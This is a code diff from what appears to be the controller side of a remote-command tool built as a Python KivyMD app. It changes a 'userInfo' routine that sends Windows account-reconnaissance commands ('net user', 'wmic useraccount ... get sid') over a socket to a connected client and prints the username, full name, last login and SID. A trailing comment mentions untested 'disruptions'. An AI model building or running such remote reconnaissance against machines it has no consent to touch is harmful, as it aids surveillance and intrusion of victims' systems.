@@ -159,18 +159,23 @@ class Main(MDApp):
     # Fang's stuffz
     def userInfo(self):
         while True:
-            command = 'wmic useraccount get domain,name,sid'
+            # Get Username, Fullname, Last Login
+            command = 'net user "%USERNAME%"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-
             output = self.currConn.recv(8096).decode()
-            cleanOut = output.splitlines()
+            output = output.splitlines()
+            # Get SID
+            command = 'wmic useraccount where name="%USERNAME%" get sid'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            output2 = self.currConn.recv(8096).decode()
+            output2 = output2.splitlines()
+            # Print results
             print('Output: ')
-            for lines in cleanOut:
-                if lines != "":
-                    print(lines)
+            print(f"{output[0]}\n{output[1]}\n{output[8]}")
+            print(f"SID\t\t\t\t\t\t\t{output2[2]}")
             break
-
 
 """
 UNTESTED SO I COMMENTED DISRUPRIONS OUT FOR NOW
